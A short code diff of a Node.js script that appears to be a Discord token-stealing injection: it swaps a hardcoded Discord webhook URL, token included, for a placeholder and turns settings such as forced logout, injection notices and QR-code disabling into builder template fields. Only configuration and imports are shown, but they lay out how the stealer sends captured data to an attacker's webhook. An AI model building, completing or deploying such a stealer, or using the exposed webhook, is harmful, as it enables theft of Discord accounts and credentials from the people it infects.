@@ -6,15 +6,15 @@ const https = require('https');
 const { exec } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
-const webhook = "https://discord.com/api/webhooks/930487593160835172/I3mgy-QTVb9PSDpusXd_h_EmATZuHU6p79zDRqC4MqWaioBBGemQVwHgVXzWFUP94itm"
+const webhook = "da_webhook"
 
 const config = {
-    "logout": "false",
-    "inject-notify": "true",
-    "logout-notify": "true",
-    "init-notify":"true",
-    "embed-color": 3447704,
-    "disable-qr-code": "false"
+    "logout": "%LOGOUT%1",
+    "inject-notify": "%INJECTNOTI%1",
+    "logout-notify": "%LOGOUTNOTI%1",
+    "init-notify":"%INITNOTI%1",
+    "embed-color": %MBEDCOLOR%1,
+    "disable-qr-code": "%DISABLEQRCODE%1"
 }
 
 
@@ -189,4 +189,3 @@ function injectNotify() {
     })
 
 }
-
